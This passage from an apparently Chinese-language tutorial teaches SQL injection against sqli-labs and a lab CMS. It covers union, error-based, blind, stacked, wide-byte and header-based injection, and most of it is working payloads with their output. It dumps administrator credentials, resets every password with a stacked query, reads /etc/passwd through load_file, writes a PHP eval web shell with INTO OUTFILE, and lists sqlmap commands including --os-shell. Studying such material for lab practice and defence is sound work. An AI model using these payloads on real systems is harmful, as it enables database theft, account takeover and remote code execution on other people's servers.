href="#1-4-其他知识补充" class="headerlink" title="1.4 其他知识补充"></a><strong>1.4</strong> 其他知识补充</h3><h4 id="1-4-1-MySQL-数据库中的注释"><a href="#1-4-1-MySQL-数据库中的注释" class="headerlink" title="1.4.1  MySQL 数据库中的注释"></a><strong>1.4.1</strong>  <strong>MySQL</strong> <strong>数据库中的注释</strong></h4><table><thead><tr><th>减减空格（三个字符）【– 】</th><th>–+</th></tr></thead><tbody><tr><td>井号 【#】</td><td>%23</td></tr><tr><td>内联注释 &#x2F;<em>!5000 AJEST</em>&#x2F;</td><td></td></tr></tbody></table><h4 id="1-4-2-SQL-注入流程"><a href="#1-4-2-SQL-注入流程" class="headerlink" title="1.4.2  SQL 注入流程"></a><strong>1.4.2</strong>  <strong>SQL</strong> <strong>注入流程</strong></h4><p>库——》表——》列——》数据</p><h4 id="1-4-3-可以代替空格的字符"><a href="#1-4-3-可以代替空格的字符" class="headerlink" title="1.4.3  可以代替空格的字符"></a><strong>1.4.3</strong>  <strong>可以代替空格的字符</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;%0Aand%0A1=1%23 </span><br><span class="line">?id=1&#x27;%0Band%0B1=1%23 </span><br><span class="line">?id=1&#x27;%0Dand%0D1=2%23 </span><br><span class="line">?id=1&#x27;%A0and%A01=2%23</span><br></pre></td></tr></table></figure><h2 id="2-SQL-注入基本手法"><a href="#2-SQL-注入基本手法" class="headerlink" title="2.SQL 注入基本手法"></a>2.<strong>SQL</strong> 注入基本手法</h2><h3 id="2-1-联合查询"><a href="#2-1-联合查询" class="headerlink" title="2.1  联合查询"></a><strong>2.1</strong>  联合查询</h3><h4 id="2-1-1-必要条件"><a href="#2-1-1-必要条件" class="headerlink" title="2.1.1  必要条件"></a><strong>2.1.1</strong>  <strong>必要条件</strong></h4><ul><li><p>两条select 语句查询结果具有相同列数；</p></li><li><p>对应的列数据类型相同（特殊情况下，条件被放松）。</p></li></ul><h4 id="2-1-2-目标分析"><a href="#2-1-2-目标分析" class="headerlink" title="2.1.2 目标分析"></a>2.1.2 目标分析</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=32 ?id=33</span><br><span class="line">select * from tbName where id=32</span><br><span class="line">select * from tbName where id=32 union select ....</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-1-3-判断列数"><a href="#2-1-3-判断列数" class="headerlink" title="2.1.3 判断列数"></a>2.1.3 判断列数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=32 order by 1 </span><br><span class="line">?id=32 order by 2</span><br><span class="line">...</span><br><span class="line">?id=32 order by 15    正常</span><br><span class="line">?id=32 order by 16    不正常</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"># 当前select 语句中具有15 列。</span><br><span class="line"></span><br><span class="line">?id=32 union select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null</span><br><span class="line">?id=32 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-1-4-判断显示位置"><a href="#2-1-4-判断显示位置" class="headerlink" title="2.1.4  判断显示位置"></a><strong>2.1.4</strong>  <strong>判断显示位置</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">把第一条select 语句的查询条件置为假。</span><br><span class="line"></span><br><span class="line">?id=32 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 ?id=-32 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15</span><br><span class="line">?id=32 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p><strong>2.1.5</strong>  <strong>数据库中敏感信息</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=32 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,database(),12,13,14,15 ?id=32 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,version(),12,13,14,15 ?id=32 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,@@datadir,12,13,14,15 ?id=32 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,current_user(),12,13,14,15</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p><strong>2.1.6</strong>  <strong>获取管理员账密</strong></p><p><code>**数据库名**</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-33 UNION SELECT 1,2,database(),4,5,6,7,8,9,10,11,12,13,14,15</span><br><span class="line"></span><br><span class="line">#  cms</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>**表名**</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-33 UNION SELECT 1,2,count(*),4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.tables where table_schema=database()</span><br><span class="line"></span><br><span class="line">?id=-33 UNION SELECT 1,2,hex(table_name),4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.tables where table_schema=database() limit 0,1</span><br><span class="line"></span><br><span class="line">?id=-33 UNION SELECT 1,2,hex(table_name),4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.tables where table_schema=database() limit 1,1</span><br><span class="line"></span><br><span class="line">?id=-33 UNION SELECT 1,2,hex(group_concat(table_name)),4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.tables where table_schema=database()</span><br><span class="line"></span><br><span class="line"># 636D735F61727469636C652C636D735F63617465676F72792C636D735F66696C652C636D735F667269656E646C696E6B2C636D735F6D6573 736167652C636D735F6E6F746963652C636D735F706167652C636D735F7573657273</span><br><span class="line"></span><br><span class="line"># cms_article,cms_category,cms_file,cms_friendlink,cms_message,cms_notice,cms_page,cms_users</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>**列名**</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-33 UNION SELECT 1,2,hex(group_concat(column_name)),4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.columns where table_schema=database()   and table_name=&#x27;cms_users&#x27;</span><br><span class="line"></span><br><span class="line">#  7573657269642C757365726E616D652C70617373776F7264</span><br><span class="line"></span><br><span class="line"># userid,username,password</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>**数据**</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-33 UNION SELECT 1,2,hex(concat(username,0x3a,password)),4,5,6,7,8,9,10,11,12,13,14,15 from cms_users</span><br><span class="line"></span><br><span class="line">#  61646D696E3A6531306164633339343962613539616262653536653035376632306638383365</span><br><span class="line"></span><br><span class="line"># admin:e10adc3949ba59abbe56e057f20f883e # admin:123456</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-2-报错注入"><a href="#2-2-报错注入" class="headerlink" title="2.2 报错注入"></a>2.2 报错注入</h3><p>在注入点的判断过程中，发现数据库中SQL 语句的报错信息，会显示在页面中，因此可以利用报错信息进行注入。</p><p>报错注入的原理，在错误信息中执行SQL 语句。触发报错的方式有很多，具体细节也不尽相同。此处建议直接背公式，将公式带换掉 1&#x3D;1  的部分。</p><h4 id="2-2-1-group-by"><a href="#2-2-1-group-by" class="headerlink" title="2.2.1  group by"></a><strong>2.2.1</strong>  <a href="https://bugs.mysql.com/bug.php?id=8652"><strong>group</strong> <strong>by</strong></a></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=33 and (select 1 from (select count(*),concat(0x5e,(select database()),0x5e,floor(rand()*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br><span class="line">?id=33 and (select 1 from (select count(*),concat(0x5e,(select password from cms_users limit 0,1),0x5e,floor(rand()*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-2-2-extractvalue"><a href="#2-2-2-extractvalue" class="headerlink" title="2.2.2  extractvalue"></a><strong>2.2.2</strong>  <strong>extractvalue</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=33 and extractvalue(1,concat(0x5e,(select database()),0x5e))</span><br><span class="line"></span><br><span class="line">?id=33 and extractvalue(1,concat(0x5e,substr((select password from cms_users),17,32),0x5e))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-2-3-updatexml"><a href="#2-2-3-updatexml" class="headerlink" title="2.2.3  updatexml"></a><strong>2.2.3</strong>  <strong>updatexml</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=33 and updatexml(1,concat(0x5e,(select database()),0x5e),1)</span><br><span class="line"></span><br><span class="line">?id=33 and updatexml(1,concat(0x5e,(select substr(password,1,16) from cms_users),0x5e),1)</span><br><span class="line"></span><br><span class="line">?id=33 and updatexml(1,concat(0x5e,(select substr(password,17,32) from cms_users),0x5e),1)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-3-布尔盲注"><a href="#2-3-布尔盲注" class="headerlink" title="2.3 布尔盲注"></a><strong>2.3</strong> 布尔盲注</h3><p>页面中有布尔类型的状态，可以根据布尔类型状态，对数据库中的内容进行判断。</p><h4 id="2-3-1-库名爆破"><a href="#2-3-1-库名爆破" class="headerlink" title="2.3.1  库名爆破"></a><strong>2.3.1</strong>  <strong>库名爆破</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/Less-8/?id=2&#x27; and database()=&#x27;xxx&#x27; --+ </span><br><span class="line">#  不知道数据库名有多少位</span><br><span class="line">#  不知道数据库名的字符集合</span><br><span class="line">#  爆破成本很高</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-3-2-库名长度"><a href="#2-3-2-库名长度" class="headerlink" title="2.3.2  库名长度"></a><strong>2.3.2</strong>  <strong>库名长度</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/Less-8/?id=2&#x27; and length(database())=8 --+ </span><br><span class="line">#  页面正常，说明数据库名字的长度是8</span><br></pre></td></tr></table></figure><h4 id="2-3-3-按位测试"><a href="#2-3-3-按位测试" class="headerlink" title="2.3.3  按位测试"></a><strong>2.3.3</strong>  <strong>按位测试</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#  第一位</span><br><span class="line">/sqli-labs/Less-8/?id=2&#x27; and ascii(substr(database(),1,1))=115 --+ #  115</span><br><span class="line"># s</span><br><span class="line"></span><br><span class="line">/sqli-labs/Less-8/?id=2&#x27; and ascii(substr(database(),2,1))=101 --+ #  115101</span><br><span class="line"># se</span><br><span class="line"></span><br><span class="line">#  第三位</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-4-延时注入"><a href="#2-4-延时注入" class="headerlink" title="2.4 延时注入"></a><strong>2.4</strong> 延时注入</h3><p>利用sleep() 语句的延时性，以时间线作为判断条件。</p><h4 id="2-4-1-数据库名字的长度"><a href="#2-4-1-数据库名字的长度" class="headerlink" title="2.4.1  数据库名字的长度"></a><strong>2.4.1</strong>  <strong>数据库名字的长度</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sqli-labs/Less-9/?id=2&#x27; and if(length(database())&gt;1,sleep(5),1) --+ </span><br><span class="line">#  页面有延时</span><br></pre></td></tr></table></figure><h4 id="2-4-2-数据库名字"><a href="#2-4-2-数据库名字" class="headerlink" title="2.4.2  数据库名字"></a><strong>2.4.2</strong>  <strong>数据库名字</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sqli-labs/Less-9/?id=2&#x27; and if(substr(database(),3,1)=&#x27;c&#x27;,sleep(5),1) --+ </span><br><span class="line">#  11510199</span><br><span class="line">#   s e c</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-5-堆叠查询"><a href="#2-5-堆叠查询" class="headerlink" title="2.5 堆叠查询"></a><strong>2.5</strong> 堆叠查询</h3><p>一次HTTP 请求，可以同时执行多条SQL 语句，包括增删改查操作。</p><p>以sqli-labs 第38 关为例子。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&#x27;;update users set password=&#x27;123456&#x27;--+</span><br></pre></td></tr></table></figure><h2 id="3-SQL-注入其他情况"><a href="#3-SQL-注入其他情况" class="headerlink" title="3.SQL 注入其他情况"></a>3.<strong>SQL</strong> 注入其他情况</h2><h3 id="3-1-宽字节注入"><a href="#3-1-宽字节注入" class="headerlink" title="3.1 宽字节注入"></a><strong>3.1</strong> 宽字节注入</h3><p>宽字节注入准确来说不是注入手法，而是另外一种比较特殊的情况。宽字节注入的目的是绕过单双引号转义，以sqli-labs-32 关为例子。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 </span><br><span class="line">?id=1&#x27; </span><br><span class="line">1\&#x27;        服务器会把单引号转义，单引号由原来的定义字符  串的特殊字符被转义为普通字符。</span><br><span class="line">315c27     非常强烈的暗示</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-1-1-代码分析"><a href="#3-1-1-代码分析" class="headerlink" title="3.1.1  代码分析"></a><strong>3.1.1</strong>  <strong>代码分析</strong></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>); backslash</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>); backslash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$string</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables if(isset($_GET[&#x27;id&#x27;])) &#123;</span></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">check_addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="comment">//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>); <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>); <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>单双引号被转义，没有其他过滤；</p></li><li><p>将与数据库交互的数据字符编码设置为了GBK。</p></li></ul><h4 id="3-1-2-GBK-编码"><a href="#3-1-2-GBK-编码" class="headerlink" title="3.1.2  GBK 编码"></a><strong>3.1.2</strong>  <strong>GBK</strong> <strong>编码</strong></h4><p><a href="https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php">GBK 汉字编码方案</a>，双字节编码，两个字节作为一个汉字。GBK 编码范围[8140,FEFE]，可以通过<a href="https://www.qqxiuzi.cn/bianma/zifuji.php">汉字字符集编码</a>查询。注意到5C 在GBK 编码的低位范围之内[40,FE]。在5C 之前添加一个字符[81,FE] 之间，该字符就会和5c 组成一个汉字。</p><p><img src="/sql%E6%B3%A8%E5%85%A5.assets/image-20230822224203047.png" alt="image-20230822224203047"></p><h4 id="3-1-3-宽字节注入"><a href="#3-1-3-宽字节注入" class="headerlink" title="3.1.3 宽字节注入"></a>3.1.3 宽字节注入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cb5c ?id=1         薥</span><br><span class="line">%cb&#x27; </span><br><span class="line">1%df\&#x27; </span><br><span class="line">31cb5c27 </span><br><span class="line">1薥&#x27;               # “吃”掉了转义字符\</span><br><span class="line"> </span><br><span class="line">/Less-32/?id=1%cb&#x27; and 1=2 union select 1,database(),3 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-2-HTTP-头部注入"><a href="#3-2-HTTP-头部注入" class="headerlink" title="3.2 HTTP 头部注入"></a><strong>3.2</strong> <strong>HTTP</strong> 头部注入</h3><p>SQL 注入点不止会出现在GET 参数或POST 参数中。</p><h4 id="3-2-1-Cookie-注入"><a href="#3-2-1-Cookie-注入" class="headerlink" title="3.2.1  Cookie 注入"></a><strong>3.2.1</strong>  <strong>Cookie</strong> <strong>注入</strong></h4><p>注入点在Cookie 数据中，以sqli-labs-20 关为例子</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /sqli-labs/Less-20/index.php HTTP/1.1 </span><br><span class="line">Host: 10.4.7.128</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 </span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://10.4.7.128/sqli-labs/Less-20/</span><br><span class="line">DNT:  1 Connection: close</span><br><span class="line">Cookie: <span class="built_in">uname</span>=Dumb<span class="string">&#x27; and 1=2 union select 1,version(),database() # Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h4 id="3-2-2-base64-注入"><a href="#3-2-2-base64-注入" class="headerlink" title="3.2.2  base64 注入"></a><strong>3.2.2</strong>  <strong>base64</strong> <strong>注入</strong></h4><p>注入的参数需要进行base64 编码，以sqli-labs-22 关为例子。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /sqli-labs/Less-22/index.php HTTP/1.1 </span><br><span class="line">Host: 10.4.7.128</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 </span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 </span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://10.4.7.128/sqli-labs/Less-22/</span><br><span class="line">DNT:  1 Connection: close</span><br><span class="line">Cookie:<span class="built_in">uname</span>=RHVtYiIgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSx2ZXJzaW9uKCksZGF0YWJhc2UoKSM= Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-2-3-User-Agent-注入"><a href="#3-2-3-User-Agent-注入" class="headerlink" title="3.2.3 User-Agent 注入"></a>3.2.3 <strong>User-Agent</strong> <strong>注入</strong></h4><p>注入的参数在User-Agent 中，以sqli-labs-18 关为例子。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">POST /sqli-labs/Less-18/ HTTP/1.1 </span><br><span class="line">Host: 10.4.7.128</span><br><span class="line">User-Agent: AJEST<span class="string">&#x27; and updatexml(1,concat(0x5e,(select database()),0x5e),1) and &#x27;</span>1 </span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 </span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded Content-Length: 36</span><br><span class="line">Origin: http://10.4.7.128 DNT:  1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://10.4.7.128/sqli-labs/Less-18/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">uname</span>=Dumb&amp;passwd=Dumb&amp;submit=Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-2-4-Referer-注入"><a href="#3-2-4-Referer-注入" class="headerlink" title="3.2.4  Referer 注入"></a><strong>3.2.4</strong>  <strong>Referer</strong> <strong>注入</strong></h4><p>注入参数在Referer 字段中，以sqli-labs-19 关为例子。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">POST /sqli-labs/Less-19/ HTTP/1.1 </span><br><span class="line">Host: 10.4.7.128</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 </span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 </span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded Content-Length: 36</span><br><span class="line">Origin: http://10.4.7.128 DNT:  1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: AJEST<span class="string">&#x27; and updatexml(1,concat(0x5e,(select database()),0x5e),1) and &#x27;</span>1 </span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">uname</span>=Dumb&amp;passwd=Dumb&amp;submit=Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4-SQL-注入读写文件"><a href="#4-SQL-注入读写文件" class="headerlink" title="4.SQL 注入读写文件"></a>4.<strong>SQL</strong> 注入读写文件</h2><h3 id="4-1-前提条件"><a href="#4-1-前提条件" class="headerlink" title="4.1 前提条件"></a><strong>4.1</strong> 前提条件</h3><h4 id="4-1-1-权限问题"><a href="#4-1-1-权限问题" class="headerlink" title="4.1.1  权限问题"></a><strong>4.1.1</strong>  <strong>权限问题</strong></h4><p>当前（连接）数据库的用户具有文件读写权限。数据库的权限粒度，某个库中某个表某个用户是否有增删改查权限。</p><p>MySQL 数据库用户，例如root@localhost，由两部分组成：</p><ul><li><p>用户名</p></li><li><p>地址</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># root@localhost</span><br><span class="line"></span><br><span class="line">and 1=2 union select 1,file_priv,3 from mysql.user where user=&#x27;root&#x27; and host=&#x27;localhost&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="4-1-2-文件路径"><a href="#4-1-2-文件路径" class="headerlink" title="4.1.2 文件路径"></a><strong>4.1.2</strong> <strong>文件路径</strong></h4><p>已知读写目标文件的绝对路径。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/</span><br><span class="line">/var/www/html/</span><br><span class="line">c:/phpstudy/www/</span><br><span class="line">c:/xampp/htdocs/</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="4-1-3-安全选项"><a href="#4-1-3-安全选项" class="headerlink" title="4.1.3  安全选项"></a><strong>4.1.3</strong>  <strong>安全选项</strong></h4><p>MySQL 数据库有关于文件读写的安全选项secure_file_priv。</p><p>secure_file_priv 参数限制了mysqld(MySQL DBMS) 的导入导出操作，这个选项是不能利用SQL 语句修改，必须修改my.ini 配置文件，并重启mysql 数据库。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &#x27;%secure_file_priv%&#x27;;</span><br></pre></td></tr></table></figure><p><strong>参数值：</strong></p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>secure_file_priv&#x3D;NULL</td><td>限制mysqld 不允许导入导出操作。</td></tr><tr><td>secure_file_priv&#x3D;’c:&#x2F;a&#x2F;</td><td>会限制mysqld 的导入导出操作在某个固定目录下，并且子目录有效。</td></tr><tr><td>secure_file_priv&#x3D;</td><td>不对mysqld 的导入导出操作做限制。</td></tr></tbody></table><h3 id="4-2-读写文件"><a href="#4-2-读写文件" class="headerlink" title="4.2 读写文件"></a><strong>4.2</strong> 读写文件</h3><h4 id="4-2-1-读取文件"><a href="#4-2-1-读取文件" class="headerlink" title="4.2.1  读取文件"></a><strong>4.2.1</strong>  <strong>读取文件</strong></h4><p>使用load_file() 函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1=2 union select 1,load_file(&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;),3</span><br><span class="line"></span><br><span class="line">and 1=2 union select 1,load_file(&quot;c:/windows/system32/drivers/etc/hosts&quot;),3</span><br><span class="line"></span><br><span class="line">and 1=2 union select1,load_file(&quot;/etc/passwd&quot;),3</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="4-2-2-写入文件"><a href="#4-2-2-写入文件" class="headerlink" title="4.2.2  写入文件"></a><strong>4.2.2</strong>  <strong>写入文件</strong></h4><p>使用into outfile 语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1=2 union select 1,2,3 into outfile &quot;c:/phpstudy_2016/www/1.php&quot;</span><br><span class="line"></span><br><span class="line">and 1=2 union select 1,&quot;&lt;?php @eval($_REQUEST[777]);phpinfo()?&gt;&quot;,3 into outfile &quot;c:/phpstudy_2016/www/2.php&quot;</span><br><span class="line"></span><br><span class="line">and 1=2 union select 1,&quot;&lt;?php @eval($_REQUEST[777]);phpinfo()?&gt;&quot;,3 into outfile &quot;/var/www/html/1.php&quot;</span><br><span class="line"></span><br><span class="line">and 1=2 union select 1,&quot;&lt;?php @eval($_REQUEST[777]);phpinfo()?&gt;&quot;,3 into outfile &quot;/tmp/1.php&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Linux 系统下，一般情况下权限较低，无法写入文件</p><h2 id="5-SQL-注入工具"><a href="#5-SQL-注入工具" class="headerlink" title="5.SQL 注入工具"></a>5.<strong>SQL</strong> 注入工具</h2><h3 id="5-1-SQLMap"><a href="#5-1-SQLMap" class="headerlink" title="5.1  SQLMap"></a><strong>5.1</strong>  <strong>SQLMap</strong></h3><h4 id="5-1-1-安装与更新"><a href="#5-1-1-安装与更新" class="headerlink" title="5.1.1  安装与更新"></a><strong>5.1.1</strong>  <strong>安装与更新</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install sqlmap</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>源码包安装：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/sqlmapproject/sqlmap.git git fetch</span><br><span class="line">git pull</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="5-1-2-参数速查"><a href="#5-1-2-参数速查" class="headerlink" title="5.1.2  参数速查"></a><strong>5.1.2</strong>  <strong>参数速查</strong></h4><table><thead><tr><th align="center">参数</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">-u</td><td align="center">检测注入点</td></tr><tr><td align="center">–dbs</td><td align="center">列出所有的库名</td></tr><tr><td align="center">–current-user</td><td align="center">当前连接数据库用户的名字</td></tr><tr><td align="center">–current-db</td><td align="center">当前数据库的名字</td></tr><tr><td align="center">-D “cms”</td><td align="center">指定目标数据库为cms</td></tr><tr><td align="center">–tables</td><td align="center">列出数据库中所有的表名</td></tr><tr><td align="center">-T “cms_users”</td><td align="center">指定目标表名为’cms_users’</td></tr><tr><td align="center">–columns</td><td align="center">列出所有的字段名</td></tr><tr><td align="center">-C ‘username,password’</td><td align="center">指定目标字段</td></tr><tr><td align="center">–dump</td><td align="center">列出字段内容</td></tr><tr><td align="center">-r</td><td align="center">从文件中读取HTTP 请求</td></tr><tr><td align="center">–os-shell</td><td align="center">在特定情况下，可以直接获得目标系统Shell</td></tr><tr><td align="center">–level 3</td><td align="center">设置sqlmap  检测等级 3</td></tr><tr><td align="center">–cookie&#x3D;”username&#x3D;admin”</td><td align="center">携带Cookie 信息进行注入</td></tr><tr><td align="center">-g</td><td align="center">利用google 搜索引擎自动搜索注入点</td></tr><tr><td align="center">–batch</td><td align="center">使用默认选项</td></tr><tr><td align="center">–random-agent</td><td align="center">使用随机User-Agent  信息</td></tr><tr><td align="center">-v 3</td><td align="center">显示payload</td></tr></tbody></table><h4 id="5-1-3-参数速查"><a href="#5-1-3-参数速查" class="headerlink" title="5.1.3  参数速查"></a><strong>5.1.3</strong>  <strong>参数速查</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点：http://10.10.10.6/cms/show.php?id=33</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://10.10.10.1/show.php?id=33&quot; sqlmap -u &quot;http://10.10.10.1/show.php?id=33&quot; --dbs</span><br><span class="line">sqlmap -u &quot;http://10.10.10.1/show.php?id=33&quot; --current-db sqlmap -u &quot;http://10.10.10.1/show.php?id=33&quot; -D &quot;cms&quot; --tables</span><br><span class="line">sqlmap -u &quot;http://10.10.10.1/show.php?id=33&quot; -D &quot;cms&quot; -T &quot;cms_users&quot; --columns</span><br><span class="line">sqlmap -u &quot;http://10.10.10.1/show.php?id=33&quot; -D &quot;cms&quot; -T &quot;cms_users&quot; -C 